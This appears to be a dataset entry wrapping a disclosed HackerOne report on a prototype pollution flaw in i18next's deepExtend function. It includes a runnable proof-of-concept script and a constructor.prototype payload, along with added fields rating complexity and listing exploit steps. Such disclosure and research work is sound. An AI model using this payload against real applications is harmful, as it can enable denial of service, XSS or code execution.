{
    "reported_to": "Node.js third-party modules",
    "reported_by": "0b5cur17y ",
    "title": "[i18next] Prototype pollution attack",
    "content": "\nI would like to report a prototype pollution vulnerability in i18next.\nIt allows to modify the prototype of a base object, which may result in DoS, XSS, RCE, etc. depending on the way the library is used.\nModule\nmodule name: i18next\nversion: 19.7.0\nnpm page: https://www.npmjs.com/package/i18next\nModule Description\ni18next is a very popular internationalization framework for browser or any other javascript environment (eg. node.js).\nModule Stats\nWeekly downloads: 1,003,465\nVulnerability\nVulnerability Description\nThe i18next API provides a function addResourceBundle in src/ResourceStore.js:79 (see API docs here).\nIt allows to set many translations at once. Optionally, it can process nested objects and overwrite existing translations.\nFor example, you can call i18next.addResourceBundle('en', 'translations', { homepage: { title: 'The English Title'} }, true, true); to set the key \"homepage.title\" to \"The English Title\", overwriting it if it existed before.\nThe function addResourceBundle uses a utility function deepExtend to process nested objects.\nIt is defined in src/utils.js:84.\nThis function attempts to guard against prototype pollution by blacklisting the property __proto__.\nHowever, it does not blacklist the property constructor.\nTo pollute Object you could thus set a translation like { constructor: { prototype: { polluted: true } } }.\nFor an application to be vulnerable, it has to use addResourceBundle with attacker-controlled input passed into the resources argument.\nMoreover, both arguments deep and overwrite must be set to true.\nSteps To Reproduce:\nTo try it out quickly, you can just copy the function deepExtend from src/utils.js:84\nand use it to apply the above-mentioned payload to an empty object, with the overwrite argument set to true.\nThe following self-contained code snipped exemplifies how to do it.\nCopy and paste to a file \"main.js\" and run in \"node main.js\".\nIt will print \"Object is polluted\".\nCode 1.14 KiB\n1// -------------- deepExtend as defined in i18next -------------- \n2function deepExtend(target, source, overwrite) {\n3  /* eslint no-restricted-syntax: 0 */\n4  for (const prop in source) {\n5    if (prop !== '__proto__') {\n6      if (prop in target) {\n7        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch\n8        if (\n9          typeof target[prop] === 'string' ||\n10          target[prop] instanceof String ||\n11          typeof source[prop] === 'string' ||\n12          source[prop] instanceof String\n13        ) {\n14          if (overwrite) target[prop] = source[prop];\n15        } else {\n16          deepExtend(target[prop], source[prop], overwrite);\n17        }\n18      } else {\n19        target[prop] = source[prop];\n20      }\n21    }\n22  }\n23  return target;\n24}\n25// --------------------------------------------------------------- \n26\n27const translations = '{ \"constructor\": { \"prototype\": { \"polluted\": true} } }';  \n28const existingData = {};                         \n29                                                  \n30deepExtend(existingData, JSON.parse(translations), true)\n31\n32if ({}.polluted)\n33    console.log(\"Object is polluted\")\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nThe vulnerability may result in DoS, XSS, RCE, etc. depending on the way the library is used.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Modification of Assumed-Immutable Data (MAID)"
    ],
    "screenshots": {},
    "disclosed_date": 1619484720,
    "report_url": "https://hackerone.com/reports/968355",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Identify the vulnerable function `deepExtend` in i18next's `src/utils.js`"
        ],
        [
            2,
            "Craft a malicious payload to exploit the prototype pollution via the `constructor` property, e.g., `{ constructor: { prototype: { polluted: true } } }`"
        ],
        [
            3,
            "Use the `addResourceBundle` function with `deep` and `overwrite` set to `true` to apply the payload"
        ]
    ],
    "vuln_description": "The vulnerability is a prototype pollution in i18next's `deepExtend` function, which fails to properly sanitize the `constructor` property, allowing attackers to modify the prototype of base objects. This can lead to various security issues like DoS, XSS, or RCE depending on how the library is used.",
    "reason": "The vulnerability requires understanding of prototype pollution and the specific implementation of `deepExtend` in i18next. The attack involves crafting a specific payload and knowing the right conditions (setting `deep` and `overwrite` to `true`) to trigger the vulnerability. However, the steps are straightforward once the vulnerable function and the right conditions are identified.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}